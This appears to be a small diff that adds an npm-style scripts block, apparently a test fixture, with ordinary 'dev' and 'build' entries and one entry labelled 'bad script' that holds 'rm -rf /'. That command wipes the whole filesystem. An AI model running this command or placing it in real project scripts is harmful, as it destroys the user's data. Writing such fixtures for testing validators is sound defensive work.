@@ -1,0 +1,7 @@
+{
+  "scripts": {
+    "dev": "node server.js",
+    "build": "pnpm run compile",
+    "bad script": "rm -rf /"
+  }
+}
